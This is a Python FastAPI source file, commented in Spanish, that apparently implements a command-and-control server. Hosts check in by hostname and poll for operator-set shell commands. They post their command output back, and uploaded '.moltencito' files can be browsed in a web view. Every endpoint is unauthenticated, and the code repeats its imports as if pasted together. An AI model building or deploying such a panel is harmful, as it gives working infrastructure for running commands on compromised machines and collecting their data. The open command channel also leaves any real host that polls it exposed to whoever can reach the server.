
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse,RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import os
from starlette.status import HTTP_303_SEE_OTHER


app = FastAPI(title="Panel de Control", version="0.1.0")

# Archivos estáticos (CSS/JS/Imágenes)
app.mount("/static", StaticFiles(directory="static"), name="static")

# Motor de plantillas
templates = Jinja2Templates(directory="templates")

@app.get("/", response_class=HTMLResponse, tags=["UI"])
async def index(request: Request):
    """
    Página inicial con la descripción del proyecto.
    Edita 'templates/index.html' para modificar el contenido.
    """
    context = {
        "request": request,
        "project_title": "Panel de Control",
        "project_description": "Escribe aquí la descripción de tu proyecto…",
    }
    return templates.TemplateResponse("index.html", context)

# --- Endpoints previstos (esqueleto) ---


@app.get("/uploads", response_class=HTMLResponse, tags=["UI"])
async def uploads_ui(request: Request):
    return templates.TemplateResponse("placeholder.html", {
        "request": request,
        "title": "Uploads",
        "message": "Próximamente: módulo de cargas de archivos."
    })


from fastapi import FastAPI, Request, Form, UploadFile, File, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from typing import Optional
import os, json, time, uuid
from datetime import datetime

DB_PATH = os.path.join("data", "comander_db.json")
os.makedirs("data", exist_ok=True)
if not os.path.exists(DB_PATH):
    with open(DB_PATH, "w", encoding="utf-8") as f:
        json.dump({"machines": {}, "history": [], "responses": []}, f, ensure_ascii=False, indent=2)

def _load_db():
    with open(DB_PATH, "r", encoding="utf-8") as f:
        return json.load(f)

def _save_db(db):
    with open(DB_PATH, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=2)

def _now_iso():
    return datetime.utcnow().isoformat() + "Z"

@app.post("/status", tags=["API"])
async def report_status(machine: str = Form(...)):
    """
    Registra/actualiza un hostname que reporta estado.
    Crea la entrada si no existe.
    """
    db = _load_db()
    m = db["machines"].get(machine) or {}
    m["machine"] = machine
    m["last_seen"] = _now_iso()
    # current_command es el último comando seteado para este host (si existe)
    if "current_command" not in m:
        m["current_command"] = None
    # mantener un pequeño contador simple de comandos enviados
    if "command_version" not in m:
        m["command_version"] = 0
    db["machines"][machine] = m
    _save_db(db)
    return {"status": "ok", "machine": machine, "last_seen": m["last_seen"], "current_command": m["current_command"]}

@app.get("/Comander", response_class=HTMLResponse, tags=["UI"])
async def comander_ui(request: Request, machine: Optional[str] = None):
    """
    Interfaz estilo terminal:
    - Lista máquinas vistas por /status (sidebar interna)
    - Permite setear un nuevo comando para la máquina seleccionada
    - Muestra historial
    """
    db = _load_db()
    machines = sorted(db["machines"].keys())
    selected = machine or (machines[0] if machines else None)
    current_command = db["machines"].get(selected, {}).get("current_command") if selected else None
    history = [h for h in db["history"] if not selected or h.get("machine") == selected]
    # ordenar historial reciente primero
    history.sort(key=lambda x: x.get("created_at",""), reverse=True)
    return templates.TemplateResponse("comander.html", {
        "request": request,
        "machines": machines,
        "selected": selected,
        "current_command": current_command,
        "history": history,
    })

@app.post("/Comander", tags=["API"])
async def comander_poll(machine: str = Form(...)):
    """Polling del servidor remoto. Devuelve solo {'command': ...}."""
    db = _load_db()
    if machine not in db["machines"]:
        raise HTTPException(status_code=404, detail="Hostname no registrado. Reporte por /status primero.")
    m = db["machines"][machine]
    return {"command": m.get("current_command")}

@app.post("/Comander/set", tags=["API"])
async def comander_set(machine: str = Form(...), command: str = Form(...)):
    """Setea comando y redirige a /Comander para no quedar en /Comander/set."""
    command = command.strip()
    if not command:
        raise HTTPException(status_code=400, detail="Comando vacío.")
    db = _load_db()
    if machine not in db["machines"]:
        raise HTTPException(status_code=404, detail="Hostname no registrado. Reporte por /status primero.")
    cmd_obj = {
        "id": str(uuid.uuid4())[:8],
        "machine": machine,
        "command": command,
        "created_at": _now_iso()
    }
    db["machines"][machine]["current_command"] = cmd_obj
    db["machines"][machine]["command_version"] = db["machines"][machine].get("command_version", 0) + 1
    db["history"].append(cmd_obj)
    _save_db(db)
    # importantísimo: 303 para que sea POST->GET
    return RedirectResponse(url=f"/Comander?machine={machine}", status_code=HTTP_303_SEE_OTHER)




@app.get("/readinfo", response_class=HTMLResponse, tags=["UI"])
async def readinfo_list(request: Request):
    """
    Lista los archivos con extensión .moltencito dentro de la carpeta uploads/.
    """
    os.makedirs("uploads", exist_ok=True)
    files = sorted([f for f in os.listdir("uploads") if f.endswith(".moltencito")])
    return templates.TemplateResponse("readinfo_list.html", {
        "request": request,
        "files": files
    })

def _safe_name(name: str) -> str:
    # Permite solo nombres base sin rutas y con extensión .moltencito
    base = os.path.basename(name)
    if not base.endswith(".moltencito"):
        raise HTTPException(status_code=400, detail="Solo se permiten archivos .moltencito")
    # Evita nombres vacíos o traversal
    if base in ("", ".", "..") or "/" in base:
        raise HTTPException(status_code=400, detail="Nombre de archivo inválido")
    return base

@app.get("/readinfo/view", response_class=HTMLResponse, tags=["UI"])
async def readinfo_view(request: Request, name: str):
    """
    Muestra el contenido del archivo seleccionado (.moltencito).
    """
    os.makedirs("uploads", exist_ok=True)
    base = _safe_name(name)
    path = os.path.join("uploads", base)
    if not os.path.exists(path):
        raise HTTPException(status_code=404, detail="Archivo no encontrado")

    try:
        # Intentar leer como texto UTF-8; si falla, mostrar aviso de binario
        with open(path, "rb") as fh:
            raw = fh.read()
        try:
            content = raw.decode("utf-8")
        except UnicodeDecodeError:
            content = f"[binario] {len(raw)} bytes — no es texto UTF-8"
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error al leer el archivo: {e}")

    return templates.TemplateResponse("readinfo_view.html", {
        "request": request,
        "name": base,
        "content": content
    })
from typing import Optional  # ya lo tienes arriba

@app.get("/Responses", response_class=HTMLResponse, tags=["UI"])
async def responses_ui(request: Request, machine: Optional[str] = None):
    """
    Vista para listar salidas por servidor.
    """
    db = _load_db()
    machines = sorted(db.get("machines", {}).keys())
    selected = machine or (machines[0] if machines else None)

    items = db.setdefault("responses", [])
    if selected:
        items = [r for r in items if r.get("machine") == selected]

    # más recientes primero
    items.sort(key=lambda r: r.get("created_at", ""), reverse=True)

    return templates.TemplateResponse("responses.html", {
        "request": request,
        "machines": machines,
        "selected": selected,
        "items": items
    })
from typing import Optional
import codecs

def _decode_escapes_maybe(s: str) -> str:
    """Convierte \n, \t, \r literales en saltos reales si vienen escapados."""
    if s is None:
        return s
    if ("\n" in s) or ("\t" in s) or ("\r" in s):
        return s
    if ("\\n" in s) or ("\\t" in s) or ("\\r" in s):
        try:
            return codecs.decode(s, "unicode_escape")
        except Exception:
            pass
    return s

@app.post("/Responses", tags=["API"])
async def responses_post(
    stdout: str = Form(...),
    machine: str = Form(...),
    command_id: Optional[str] = Form(None),
):
    """
    Registra la salida de un comando para una máquina.
    Requiere: stdout, machine.
    Opcional: command_id. Si no llega, intenta asociarse al current_command del host.
    """
    db = _load_db()
    if machine not in db.get("machines", {}):
        raise HTTPException(status_code=404, detail="Hostname no registrado. Reporte por /status primero.")

    # 1) Decodificar los escapes de stdout si vienen como texto con \n \t
    stdout_decoded = _decode_escapes_maybe(stdout)

    # 2) Resolver el texto del comando (cmd_text)
    cmd_text = None

    if command_id:
        # Buscar en historial para obtener el comando asociado a ese ID
        for h in reversed(db.get("history", [])):
            if h.get("id") == command_id:
                cmd_text = h.get("command")
                break
    else:
        # No hay command_id: usar el comando actual asignado al host (si existe)
        current = db["machines"][machine].get("current_command")
        if current:
            command_id = current.get("id")
            cmd_text = current.get("command")

    # 3) Fallback si no pudimos determinarlo
    if not cmd_text:
        cmd_text = "(desconocido)"

    # 4) Guardar la entrada correctamente (command != stdout)
    entry = {
        "id": str(uuid.uuid4())[:8],
        "machine": machine,
        "command_id": command_id,
        "command": cmd_text,        # ← TEXTO DEL COMANDO
        "stdout": stdout_decoded,   # ← SOLO LA SALIDA
        "stdout_raw": stdout,       # opcional: conservar original
        "created_at": _now_iso(),
    }

    db.setdefault("responses", []).append(entry)
    _save_db(db)
    return {"status": "ok"}
